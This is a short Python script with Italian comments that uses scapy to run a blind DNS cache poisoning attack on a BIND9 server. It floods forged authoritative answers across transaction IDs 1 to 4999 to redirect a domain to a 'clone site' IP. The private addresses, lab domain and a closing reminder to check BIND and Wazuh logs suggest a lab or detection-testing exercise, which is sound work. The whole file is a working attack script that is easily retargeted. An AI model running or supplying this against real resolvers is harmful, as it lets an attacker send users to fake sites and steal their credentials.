from scapy.all import *
import time

# Configurazione dell'attacco
dns_server = "172.20.0.53"      # IP del BIND9
target_domain = "www.progetto.ns." # Il dominio da avvelenare
malicious_ip = "172.20.0.80"    # IP del Sito Clone (web_clone)

print(f"[*] Avvio attacco di Poisoning su {dns_server}...")
print(f"[*] Obiettivo: Dirottare {target_domain} verso {malicious_ip}")

# Forging del pacchetto DNS falsificato
# In un blind attack reale, bisogna indovinare il Transaction ID (ID)
# Qui ne inviamo una raffica con diversi ID per simulare il tentativo di "collisione"
def brute_force_poison():
    for tx_id in range(1, 5000): # Proviamo un range di ID
        # Costruzione del pacchetto:
        # IP: sorgente spoofata 
        # UDP: porta 53
        # DNS: Risposta (qr=1) autoritativa (aa=1) con il record A falso
        packet = (
            IP(dst=dns_server) /
            UDP(sport=53, dport=53) /
            DNS(id=tx_id, qr=1, aa=1, 
                qd=DNSQR(qname=target_domain), 
                an=DNSRR(rrname=target_domain, type='A', rdata=malicious_ip, ttl=3600))
        )
        send(packet, verbose=0)
        if tx_id % 100 == 0:
            print(f"[+] Inviati {tx_id} pacchetti...")

if __name__ == "__main__":
    brute_force_poison()
    print("[!] Attacco completato. Controlla i log di BIND e Wazuh!")